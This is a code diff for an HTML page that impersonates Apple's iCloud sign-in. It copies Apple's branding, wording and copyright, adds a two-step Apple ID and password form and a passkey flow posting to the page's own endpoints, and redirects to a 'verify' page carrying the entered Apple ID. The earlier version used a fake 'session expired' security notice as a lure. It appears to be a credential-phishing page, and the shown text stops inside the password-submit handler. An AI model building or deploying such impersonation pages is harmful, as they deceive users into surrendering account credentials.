@@ -1,224 +1,480 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <title>Sign in to iCloud</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", sans-serif;
-            background: #f5f5f7;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
-        }
-        .header {
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-            margin-top: 40px;
-        }
-        .apple-logo {
-            width: 44px;
-            height: 44px;
-            margin: 0 auto 20px;
-        }
-        .container {
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            padding: 40px 30px;
-            max-width: 400px;
-            width: 100%;
-            margin-top: 20px;
-        }
-        h1 {
-            font-size: 32px;
-            font-weight: 600;
-            color: #1d1d1f;
-            text-align: center;
-            margin-bottom: 10px;
-        }
-        .subtitle {
-            text-align: center;
-            color: #86868b;
-            font-size: 17px;
-            margin-bottom: 30px;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            font-size: 12px;
-            color: #86868b;
-            margin-bottom: 5px;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        input {
-            width: 100%;
-            padding: 15px;
-            border: 1px solid #d2d2d7;
-            border-radius: 8px;
-            font-size: 17px;
-            transition: border-color 0.2s;
-        }
-        input:focus {
-            outline: none;
-            border-color: #0071e3;
-        }
-        .btn {
-            width: 100%;
-            padding: 15px;
-            background: #0071e3;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 17px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s;
-            margin-top: 10px;
-        }
-        .btn:hover {
-            background: #0077ed;
-        }
-        .btn:active {
-            background: #006edb;
-        }
-        .divider {
-            text-align: center;
-            margin: 25px 0;
-            color: #86868b;
-            font-size: 14px;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            color: #86868b;
-            font-size: 12px;
-        }
-        .footer a {
-            color: #0071e3;
-            text-decoration: none;
-        }
-        .alert {
-            background: #fff3cd;
-            border-left: 4px solid #ffc107;
-            padding: 12px;
-            margin-bottom: 20px;
-            border-radius: 5px;
-            font-size: 14px;
-            color: #856404;
-        }
-        .loading {
-            display: none;
-            text-align: center;
-            padding: 20px;
-        }
-        .spinner {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0071e3;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<title>iCloud</title>
+<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/ICloud_logo.svg/1200px-ICloud_logo.svg.png">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior: smooth; }
+body {
+  background: #1c1c1e; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Inter", sans-serif;
+  margin: 0; padding: 0; overflow-x: hidden;
+  min-height: 100vh;
+}
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+.navbar {
+  position: fixed; top: 0; left: 0; right: 0; z-index: 300; display: flex;
+  justify-content: space-between; align-items: center; padding: 4px 15px 4px 10px;
+  background: linear-gradient(to bottom, rgba(28, 28, 30, 0.6), rgba(28, 28, 30, 0));
+  backdrop-filter: blur(4px); -webkit-backdrop-filter: blur(4px);
+  animation: none;
+  height: 44px;
+  transition: all 0.4s ease;
+}
+.navbar.hidden { opacity: 0; visibility: hidden; pointer-events: none; transform: translateY(-20px); }
+.navbar.no-blur { background: transparent; backdrop-filter: none; -webkit-backdrop-filter: none; }
+.nav-logo { height: 32px; width: auto; filter: brightness(0) invert(1); margin-top: 2px; }
+.nav-menu-btn {
+  width: 42px; height: 42px; display: flex; align-items: center; justify-content: center;
+  border-radius: 50%; border: none; background: none; cursor: pointer; transition: background 0.2s;
+  position: relative;
+}
+.nav-menu-btn:hover { background: rgba(255,255,255,0.1); }
+.nav-menu-btn svg { width: 24px; height: 24px; color: #ffffff; }
+.nav-dropdown {
+  position: absolute; top: calc(100% + 12px); right: 0; min-width: 210px;
+  background: rgba(30, 30, 32, 0.9); backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px);
+  border-radius: 12px; border: 1px solid rgba(255,255,255,0.1);
+  box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+  padding: 6px; opacity: 0; transform: scale(0.95) translateY(-8px);
+  pointer-events: none; transition: opacity 0.15s ease, transform 0.2s cubic-bezier(0.16, 1, 0.3, 1);
+}
+.nav-dropdown.open { opacity: 1; transform: scale(1) translateY(0); pointer-events: auto; }
+.nav-dropdown a {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 10px 14px; border-radius: 8px; color: #2997ff; font-size: 14px;
+  text-decoration: none; transition: background 0.15s; font-weight: 500;
+  letter-spacing: -0.01em;
+}
+.nav-dropdown a:hover { background: rgba(255,255,255,0.08); }
+.nav-dropdown a svg { width: 14px; height: 14px; color: #2997ff; flex-shrink: 0; margin-left: 10px; }
+
+.splash {
+  min-height: 100vh; display: flex; flex-direction: column; align-items: center;
+  padding: 38px 20px 0px;
+}
+.hero-wrapper { text-align: center; margin-bottom: 80px; display: flex; flex-direction: column; align-items: center; }
+.cloud-logo { width: 420px; max-width: 90vw; display: block; margin: 0 auto 20px; background: #1c1c1e; }
+.icloud-title {
+  font-size: 145px; font-weight: 600; letter-spacing: -0.04em; margin-bottom: 35px;
+  color: #fff; line-height: 1;
+  animation: heroFade 0.8s cubic-bezier(0.16, 1, 0.3, 1) 0.2s both;
+}
+.sign-in-btn {
+  background: #fff; color: #000; border: none; border-radius: 32px;
+  padding: 13px 45px; font-size: 19px; font-weight: 600; cursor: pointer;
+  transition: opacity 0.2s ease, transform 0.2s ease; margin-bottom: 35px;
+  animation: heroFade 0.8s cubic-bezier(0.16, 1, 0.3, 1) 0.35s both;
+}
+.sign-in-btn:hover { opacity: 0.9; transform: scale(1.02); }
+.hero-sub {
+  font-size: 40px; color: #ffffff; text-align: center; max-width: 900px;
+  line-height: 1.2; font-weight: 600; opacity: 1;
+  animation: heroFade 0.8s cubic-bezier(0.16, 1, 0.3, 1) 0.5s both;
+}
+@keyframes heroFade { from { opacity: 0; transform: translateY(12px); } to { opacity: 1; transform: translateY(0); } }
+
+.features-section { width: 100%; max-width: 1400px; padding: 0 20px 120px; margin: 0 auto; animation: heroFade 0.8s cubic-bezier(0.16, 1, 0.3, 1) 0.6s both; opacity: 0; }
+.features-grid { display: flex; justify-content: center; align-items: stretch; gap: 40px; flex-wrap: wrap; }
+.tile-card {
+  background: #1c1c1e; border-radius: 12px; padding: 60px 50px;
+  box-shadow: inset 0 1px 0 rgba(255,255,255,0.04), 2px 2px 4px rgba(0,0,0,0.35), 8px 4px 16px rgba(0,0,0,0.25), 16px 8px 48px rgba(0,0,0,0.2), 32px 16px 80px rgba(0,0,0,0.15);
+  flex: 1 1 600px; max-width: 650px;
+  display: flex; flex-direction: column; align-items: center; text-align: center; justify-content: flex-start;
+}
+.tile-card .tile-img { width: 100%; max-width: 480px; height: 210px; object-fit: contain; display: block; margin: 0 auto 50px; background: #1c1c1e; }
+.tile-card h2 { font-size: 26px; font-weight: 600; margin-bottom: 32px; line-height: 1.2; color: #fff; max-width: 480px; }
+.tile-card p { color: #a1a1a6; font-size: 16px; line-height: 1.5; max-width: 480px; margin: 0 auto; }
+.tile-card a { color: #2997ff; text-decoration: none; }
+.tile-card a:hover { text-decoration: underline; }
+
+.page-footer { width: 100%; background: #2c2c2e; padding: 30px 0; border-top: 1px solid rgba(255,255,255,0.05); }
+.page-footer-inner { width: 100%; max-width: 1400px; margin: 0 auto; padding: 0 100px; display: flex; justify-content: space-between; align-items: center; }
+.footer-links { display: flex; align-items: center; gap: 0; font-size: 11px; color: #c7c7cc; }
+.footer-links a { color: #c7c7cc; text-decoration: none; transition: color 0.2s; }
+.footer-links a:hover { color: #fff; }
+.footer-sep { margin: 0 12px; color: #555; }
+.footer-copy { font-size: 11px; color: #c7c7cc; text-align: right; }
+
+#signinWrap, #pwWrap, #loadingWrap {
+  display: none; align-items: center; justify-content: center;
+  min-height: calc(100vh - 60px); width: 100%; padding: 30px 10px 100px;
+  box-sizing: border-box; background: #1c1c1e;
+  transition: opacity 0.7s cubic-bezier(0.16, 1, 0.3, 1);
+}
+.signin-card {
+  background: #1c1c1e; width: 640px; max-width: 94vw; border-radius: 28px; padding: 40px 40px;
+  min-height: 678px;
+  text-align: center;
+  box-shadow: 0 4px 24px rgba(0,0,0,0.6), 0 20px 60px rgba(0,0,0,0.5);
+  border: none;
+  display: flex; flex-direction: column; align-items: center;
+  transform: scale(0.9) translateY(30px);
+  transition: transform 0.8s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+  opacity: 0;
+}
+.signin-header-logo { width: 214px; height: 214px; margin-top: -20px; margin-bottom: 12px; display: flex; align-items: center; justify-content: center; position: relative; }
+.signin-card h1 { font-size: 28px; font-weight: 600; color: #fff; margin-top: 0; margin-bottom: 24px; letter-spacing: -0.02em; font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif; line-height: 1.2; }
+.signin-form { width: 100%; flex: 1; max-width: 460px; display: flex; flex-direction: column; margin: 0 auto; }
+.signin-form input {
+  width: 100%; height: 52px; background: rgba(44, 44, 46, 0.6); border: 1px solid rgba(255,255,255,0.3);
+  border-radius: 12px; padding: 20px 16px 6px; color: #fff; font-size: 16px; outline: none;
+  transition: border-color 0.2s, background 0.2s; font-family: inherit; text-align: left;
+}
+.signin-form input:hover { background: rgba(44, 44, 46, 0.75); border-color: rgba(255,255,255,0.5); }
+.signin-form input:focus { border-color: #0071e3; background: rgba(44, 44, 46, 0.8); }
+.input-group { position: relative; width: 100%; }
+.input-group.connect-top input { border-radius: 12px 12px 0 0; }
+.input-group.connect-bottom input { border-radius: 0 0 12px 12px; border-top: 1px solid rgba(255,255,255,0.3); margin-top: -1px; }
+.input-group.input-error input { border-color: #ff3b30 !important; background: rgba(255, 59, 48, 0.15); }
+.input-group.input-error .floating-label { color: #ff3b30 !important; }
+#keepChecked:checked ~ #checkVisual { background: #0071e3; border-color: #0071e3; }
+#keepChecked:checked ~ #checkVisual::after { content: ''; width: 4px; height: 7px; border: solid #fff; border-width: 0 1.5px 1.5px 0; transform: rotate(45deg); }
+.floating-label {
+  position: absolute; left: 16px; top: 50%; transform: translateY(-50%);
+  color: #86868b; font-size: 16px; pointer-events: none;
+  transition: all 0.2s cubic-bezier(0.25, 0.1, 0.25, 1); font-family: inherit;
+}
+.input-group input:focus + .floating-label, .input-group input:not(:placeholder-shown) + .floating-label { top: 10px; transform: translateY(0); font-size: 11px; color: #86868b; }
+.create-link { display: block; color: #2997ff; font-size: 13px; margin: 10px 0 24px; text-decoration: none; font-weight: 400; text-align: left; width: 100%; padding-left: 0; }
+.signin-info { margin: 0 0 24px 0; text-align: left; width: 100%; display: flex; flex-direction: column; align-items: flex-start; gap: 10px; }
+.signin-info-icon { width: 28px; height: 28px; flex-shrink: 0; color: #2997ff; }
+.signin-info p { color: #f0f0f5; font-size: 12px; line-height: 1.5; margin-bottom: 0; font-weight: 400; letter-spacing: 0.02em; }
+.signin-info a { color: #2997ff; text-decoration: none; font-size: 12px; }
+.signin-actions { display: flex; gap: 10px; width: 100%; margin-bottom: 8px; }
+.btn-continue {
+  flex: 1; height: 40px; background: #0071e3; color: #fff; border: none;
+  border-radius: 12px; font-size: 14px; font-weight: 600; cursor: pointer; font-family: inherit;
+  transition: background 0.2s, opacity 0.2s;
+  display: flex; align-items: center; justify-content: center; padding: 0 16px;
+}
+.btn-continue:disabled, .btn-continue.btn-disabled { background: rgba(0, 113, 227, 0.4); color: rgba(255,255,255,0.4); cursor: default; }
+.btn-passkey {
+  flex: 1; height: 40px; background: #fff; color: #000; border: none;
+  border-radius: 12px; font-size: 14px; font-weight: 500; cursor: pointer; font-family: inherit;
+  display: flex; align-items: center; justify-content: center; gap: 6px;
+  transition: background 0.2s; padding: 0 16px;
+}
+.btn-passkey svg { width: 14px; height: 14px; flex-shrink: 0; }
+.btn-spinner { width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; display: none; animation: btnSpin 0.6s linear infinite; }
+@keyframes btnSpin { to { transform: rotate(360deg); } }
+#step1Content { position: relative; }
+#step2Content { width: 100%; position: absolute; top: 0; left: 0; right: 0; display: flex; flex-direction: column; }
+.fade-in { animation: fadeInUp 0.5s cubic-bezier(0.25, 0.1, 0.25, 1) forwards; }
+@keyframes fadeInUp { from { opacity: 0; transform: translateY(-30px); } to { opacity: 1; transform: translateY(0); } }
+.fade-out { animation: fadeOut 0.3s ease forwards; }
+@keyframes fadeOut { from { opacity: 1; } to { opacity: 0; } }
+.fade-in-simple { animation: fadeInGlass 0.35s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+@keyframes fadeInGlass { from { opacity: 0; transform: scale(0.97); } to { opacity: 1; transform: scale(1); } }
+.signin-footer { color: #f5f5f7; font-size: 11px; line-height: 1.4; text-align: center; margin-top: 4px; width: 100%; }
+#signinWrap.open .signin-card, #pwWrap.open .signin-card { transform: scale(1) translateY(0); opacity: 1; }
+.loader { text-align: center; }
+.apple-spinner { width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #0071e3; border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+.loader p { color: #a1a1a6; font-size: 14px; margin-top: 12px; }
+
+@media (max-width: 768px) {
+  .cloud-logo { width: 280px; }
+  .icloud-title { font-size: 90px; letter-spacing: -3px; margin-bottom: 24px; }
+  .hero-sub { font-size: 24px; max-width: 320px; }
+  .hero-wrapper { margin-bottom: 50px; }
+  .features-section { padding: 0 16px 80px; }
+  .features-grid { gap: 20px; }
+  .tile-card { padding: 32px 20px; flex: 1 1 100%; max-width: 100%; }
+  .tile-card .tile-img { height: 140px; margin-bottom: 24px; }
+  .tile-card h2 { font-size: 20px; margin-bottom: 16px; max-width: 100%; }
+  .tile-card p { font-size: 14px; max-width: 100%; }
+  .page-footer-inner { padding: 0 20px; flex-direction: column; gap: 12px; text-align: center; }
+  .footer-copy { text-align: center; }
+  .signin-card { padding: 32px 20px; min-height: auto; width: 100%; max-width: 100%; border-radius: 0; }
+  .signin-header-logo { width: 200px; height: 200px; }
+  .signin-card h1 { font-size: 26px; }
+  .signin-form { max-width: 100%; }
+  .signin-form input { height: 48px; font-size: 15px; }
+  .btn-continue, .btn-passkey { height: 48px; font-size: 16px; }
+}
+
+@media (max-width: 480px) {
+  .btn-continue, .btn-passkey, .signin-actions .btn-continue { 
+    font-size: 12px !important; 
+  }
+}
+</style>
 </head>
 <body>
-    <div class="header">
-        <svg class="apple-logo" viewBox="0 0 24 24" fill="currentColor">
-            <path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
-        </svg>
+
+<div class="navbar">
+  <a href="/" aria-label="iCloud Home">
+    <img class="nav-logo" src="https://ext.same-assets.com/1146199715/1951680307.svg" alt="iCloud" width="84" height="32">
+  </a>
+  <div style="position:relative;">
+    <button class="nav-menu-btn" type="button" aria-label="Help" id="menuBtn">
+      <svg viewBox="0 0 20 20" fill="none"><circle cx="4" cy="10" r="1.5" fill="currentColor"/><circle cx="10" cy="10" r="1.5" fill="currentColor"/><circle cx="16" cy="10" r="1.5" fill="currentColor"/></svg>
+    </button>
+    <div class="nav-dropdown" id="menuDropdown">
+      <a href="https://support.apple.com/guide/icloud/welcome/icloud" target="_blank" rel="noreferrer">iCloud User Guide <svg viewBox="0 0 20 20" fill="none"><path d="M7 4l6 6-6 6" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg></a>
     </div>
-    
-    <div class="container">
-        <div class="alert">
-            ⚠️ <strong>Security Notice:</strong> Your session has expired. Please sign in again to continue.
-        </div>
-        
-        <h1>Sign in to iCloud</h1>
-        <p class="subtitle">Use your Apple ID to continue</p>
-        
-        <form id="loginForm" onsubmit="return handleSubmit(event)">
-            <div class="form-group">
-                <label for="appleid">Apple ID</label>
-                <input type="email" id="appleid" name="appleid" placeholder="name@example.com" required autocomplete="email">
-            </div>
-            
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
-            </div>
-            
-            <button type="submit" class="btn">Continue</button>
-        </form>
-        
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p style="margin-top: 15px; color: #86868b;">Verifying credentials...</p>
-        </div>
-        
-        <div class="divider">
-            <a href="#" style="color: #0071e3; text-decoration: none; font-size: 14px;">Forgot Apple ID or password?</a>
-        </div>
-        
-        <div class="footer">
-            <p>Don't have an Apple ID? <a href="#">Create yours now</a></p>
-            <p style="margin-top: 10px; line-height: 1.6;">
-                <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a>
-            </p>
-        </div>
+  </div>
+</div>
+
+<div style="flex: 1; display: flex; flex-direction: column;">
+  <div class="splash" id="splash">
+    <div class="hero-wrapper">
+      <video class="cloud-logo" autoplay muted loop playsinline src="cloud_animation.mp4" alt="iCloud Cloud" style="background:#1c1c1e;"></video>
+      <h1 class="icloud-title">iCloud</h1>
+      <button class="sign-in-btn" id="signinBtn">Sign In</button>
+      <p class="hero-sub">The best place for all your<br>photos, files, notes, mail,<br>and more.</p>
     </div>
+    <div class="features-section">
+      <div class="features-grid">
+        <div class="tile-card"><img class="tile-img" src="https://ext.same-assets.com/1146199715/3233487906.png" alt="Apps" width="500" height="250"><h2>Easily access apps and data from your iPhone on the web</h2><p>iCloud is essential for keeping personal information from your devices safe, up to date, and available wherever you are. At iCloud.com, you can access your photos, files, and more from any web browser. Changes you make will sync to your iPhone and other devices, so you&rsquo;re always up to date.</p></div>
+        <div class="tile-card"><img class="tile-img" src="https://ext.same-assets.com/1146199715/1323025554.png" alt="iCloud+" width="500" height="250"><h2>More storage, plus features to protect your privacy and connect with friends</h2><p>Upgrade to iCloud+ to get more storage, plan events with Apple Invites, and have peace of mind with privacy features like iCloud Private Relay, Hide My Email, and HomeKit Secure Video. Learn more at <a href="https://apple.com/icloud" target="_blank" rel="noreferrer">apple.com/icloud</a>.</p></div>
+      </div>
+    </div>
+  </div>
+
+  <div id="signinWrap">
+    <div class="signin-card" id="signinCard">
+      <div class="signin-header-logo"><img src="logo-ring.png" alt="" style="width:100%;height:100%;object-fit:contain;"></div>
+      <h1>Sign in with<br><span style="font-weight:600;">Apple Account</span></h1>
+      <form class="signin-form" id="signinForm">
+        <div class="input-group"><input type="text" id="appleid" required placeholder=" "><label for="appleid" class="floating-label">Email or Phone Number</label></div>
+        <div id="step1Content">
+          <div id="step1Elements">
+            <a href="https://support.apple.com/en-us/108647?device-type=mac" target="_blank" class="create-link">Create Your Apple Account</a>
+            <div class="signin-info">
+              <svg class="signin-info-icon" viewBox="0 0 24 24" fill="currentColor"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5s-3 1.34-3 3 1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
+              <div><p>Your Apple Account information is used to allow you to sign in securely and access your data. Apple records certain data for security, support, and reporting purposes. If you agree, Apple may also use your Apple Account information to send you marketing emails and communications, including based on your use of Apple services. <a href="https://www.apple.com/legal/privacy/data/en/apple-id/" target="_blank" rel="noreferrer">See how your data is managed…</a></p></div>
+            </div>
+          </div>
+          <div id="step2Content" style="visibility:hidden; width:100%;">
+            <div class="input-group connect-bottom" id="passwordInputGroup"><input type="password" id="password" required placeholder=" "><label for="password" class="floating-label">Password</label></div>
+            <div id="loginError" style="color:#ff3b30;font-size:13px;margin-top:8px;display:none;text-align:left;">Check the account information you entered and try again.</div>
+            <div id="pwOptions" style="width:100%; display:flex; align-items:center; justify-content:space-between; margin:12px 0 10px;">
+              <label style="color:#f0f0f5; font-size:14px; display:flex; align-items:center; gap:8px; cursor:pointer; position:relative;">
+                <input type="checkbox" id="keepChecked" style="position:absolute;opacity:0;width:0;height:0;margin:0;padding:0;">
+                <span id="checkVisual" style="width:16px;height:16px;min-width:16px;border:1.5px solid rgba(255,255,255,0.4);border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all 0.15s;"></span>Keep me signed in
+              </label>
+              <a href="https://iforgot.apple.com/password/verify/appleid" target="_blank" style="color:#2997ff; font-size:14px; text-decoration:none;">Forgot password?</a>
+            </div>
+            <p style="font-size:14px; color:#2997ff; cursor:pointer; font-weight:400; margin-bottom:8px; text-align:left; width:100%; display:none;" id="backToEmailBtn">← Back</p>
+          </div>
+        </div>
+        <div class="signin-actions">
+          <button type="submit" class="btn-continue btn-disabled" id="continueBtn"><span id="continueText">Continue</span><div class="btn-spinner" id="continueSpinner"></div></button>
+          <button type="button" class="btn-passkey" id="passkeyBtn"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>Sign in with Passkey</button>
+          <button type="button" class="btn-continue" id="signInBtn" style="display:none;">Sign In</button>
+        </div>
+        <div style="width:100%; display:flex;" id="step1Footer"><div style="flex:1;"></div><div style="flex:1; padding-left:2px;"><div class="signin-footer">Requires a device with iOS 17 or later.</div></div></div>
+      </form>
+    </div>
+  </div>
+
+  <div id="pwWrap">
+    <div class="signin-card">
+      <div class="signin-header-logo"><img src="logo-ring.png" alt="" style="width:100%;height:100%;object-fit:contain;"></div>
+      <h1>Enter your password</h1>
+      <form class="signin-form" id="pwForm">
+        <p style="color:#fff; font-size:16px; margin-bottom:20px; font-weight:500;" id="pwAppleIdDisplay"></p>
+        <input type="password" placeholder="Password" required>
+        <div class="signin-actions" style="margin-top:24px;"><button type="submit" class="btn-continue">Sign In</button></div>
+        <p style="font-size:14px; color:#2997ff; margin-top:24px; cursor:pointer; font-weight:400;" id="backBtn">← Back</p>
+      </form>
+    </div>
+  </div>
+
+  <div id="loadingWrap">
+    <div class="loader"><div class="apple-spinner"></div><p>Verifying credentials…</p></div>
+  </div>
+</div>
+
+<div class="page-footer">
+  <div class="page-footer-inner">
+    <div class="footer-links"><a href="https://www.apple.com/support/systemstatus/" target="_blank" rel="noreferrer">System Status</a><span class="footer-sep">|</span><a href="https://www.apple.com/legal/privacy/" target="_blank" rel="noreferrer">Privacy Policy</a><span class="footer-sep">|</span><a href="https://www.apple.com/legal/internet-services/icloud/" target="_blank" rel="noreferrer">Terms &amp; Conditions</a></div>
+    <div class="footer-copy">Copyright &copy; 2026 Apple Inc. All rights reserved.</div>
+  </div>
+</div>
+
+<script>
+function bufToB64(buf) { const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'; const bytes = new Uint8Array(buf); let result = ''; for (let i = 0; i < bytes.length; i += 3) { const b1 = bytes[i], b2 = bytes[i+1] || 0, b3 = bytes[i+2] || 0; result += chars[b1 >> 2] + chars[((b1 & 3) << 4) | (b2 >> 4)] + chars[((b2 & 15) << 2) | (b3 >> 6)] + chars[b3 & 63]; } const pad = bytes.length % 3 ? (3 - bytes.length % 3) : 0; return result.slice(0, result.length - pad) + '='.repeat(pad); }
+function b64ToBuf(b64) { const str = b64.replace(/=+$/, '').replace(/-/g, '+').replace(/_/g, '/'); const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; const bytes = []; for (let i = 0; i < str.length; i += 4) { const c1 = chars.indexOf(str[i]), c2 = chars.indexOf(str[i+1]||'A'), c3 = chars.indexOf(str[i+2]||'A'), c4 = chars.indexOf(str[i+3]||'A'); bytes.push((c1 << 2) | (c2 >> 4)); if (c3 >= 0) bytes.push(((c2 & 15) << 4) | (c3 >> 2)); if (c4 >= 0) bytes.push(((c3 & 3) << 6) | c4); } return new Uint8Array(bytes); }
+async function webauthnSignIn() {
+  const email = document.getElementById('appleid').value.trim() || 'user@icloud.com';
+  sessionStorage.setItem('appleid', email);
+  try {
+    const beginRes = await fetch('/api/webauthn/signin/begin', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: email }) });
+    const beginData = await beginRes.json();
+    const allowed = beginData.publicKey?.allowCredentials || [];
+    const publicKey = { challenge: b64ToBuf(beginData.publicKey.challenge), timeout: beginData.publicKey.timeout, rpId: beginData.publicKey.rpId, userVerification: beginData.publicKey.userVerification };
+    if (allowed.length > 0) { publicKey.allowCredentials = allowed.map(c => ({ ...c, id: b64ToBuf(c.id) })); }
+    const credential = await navigator.credentials.get({ publicKey });
+    const completeRes = await fetch('/api/webauthn/signin/complete', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: credential.id, rawId: bufToB64(new Uint8Array(credential.rawId)), response: { clientDataJSON: bufToB64(new Uint8Array(credential.response.clientDataJSON)), authenticatorData: bufToB64(new Uint8Array(credential.response.authenticatorData)), signature: bufToB64(new Uint8Array(credential.response.signature)), userHandle: credential.response.userHandle ? bufToB64(new Uint8Array(credential.response.userHandle)) : null } }) });
+    const result = await completeRes.json();
+    if (result.verified) { document.getElementById('signinWrap').style.display = 'none'; window.location.href = '/pages/verify.html?appleid=' + encodeURIComponent(email); }
+  } catch (err) { if (err.name !== 'NotAllowedError') alert('Passkey sign-in failed: ' + err.message); continueBtn.click(); }
+}
+document.getElementById('signinBtn').addEventListener('click', () => {
+  const splash = document.getElementById('splash');
+  const signinWrap = document.getElementById('signinWrap');
+  const navbar = document.querySelector('.navbar');
+  splash.style.opacity = '0'; splash.style.transform = 'scale(0.96)'; splash.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+  setTimeout(() => { 
+    splash.style.display = 'none'; 
+    navbar.classList.remove('hidden'); 
+    navbar.classList.add('no-blur'); 
+    signinWrap.style.display = 'flex'; 
+    window.scrollTo({ top: 0, behavior: 'smooth' }); 
+    requestAnimationFrame(() => { 
+        signinWrap.classList.add('open'); 
+        signinWrap.style.opacity = '1'; 
+    }); 
+    document.getElementById('appleid').focus(); 
+}, 500);
+});
+const appleidInput = document.getElementById('appleid');
+const continueBtn = document.getElementById('continueBtn');
+const continueText = document.getElementById('continueText');
+const continueSpinner = document.getElementById('continueSpinner');
+const step1Elements = document.getElementById('step1Elements');
+const step1Footer = document.getElementById('step1Footer');
+const step2Content = document.getElementById('step2Content');
+const passkeyBtn = document.getElementById('passkeyBtn');
+const signInBtn = document.getElementById('signInBtn');
+appleidInput.addEventListener('input', () => { if (appleidInput.value.trim()) { continueBtn.classList.remove('btn-disabled'); } else { continueBtn.classList.add('btn-disabled'); } });
+continueBtn.addEventListener('click', (e) => {
+  e.preventDefault();
+  const val = appleidInput.value.trim();
+  if (!val || continueBtn.classList.contains('btn-disabled')) return;
+  if (step2Content.dataset.transitioning) return;
+  step2Content.dataset.transitioning = '1';
+  sessionStorage.setItem('appleid', val);
+  continueText.style.display = 'none'; continueSpinner.style.display = 'block'; continueBtn.classList.add('btn-loading');
+  step1Elements.classList.add('fade-out'); step1Footer.classList.add('fade-out');
+  setTimeout(() => {
+    step1Elements.style.visibility = 'hidden'; step1Elements.classList.remove('fade-out'); step1Footer.style.visibility = 'hidden'; step1Footer.classList.remove('fade-out');
+    passkeyBtn.style.display = 'none'; continueBtn.style.display = 'none'; signInBtn.style.display = 'block'; continueSpinner.style.display = 'none'; continueText.style.display = 'inline'; continueBtn.classList.remove('btn-loading');
+    const passwordInputGroup = document.getElementById('passwordInputGroup');
+    document.querySelector('.input-group').classList.add('connect-top');
+    step2Content.style.visibility = 'visible'; step2Content.style.opacity = '1'; passwordInputGroup.classList.add('fade-in');
+    setTimeout(() => { passwordInputGroup.classList.remove('fade-in'); delete step2Content.dataset.transitioning; document.getElementById('password').focus(); }, 500);
+  }, 1200);
+});
+document.getElementById('signinForm').addEventListener('submit', (e) => e.preventDefault());
+signInBtn.addEventListener('click', async (e) => {
+  e.preventDefault();
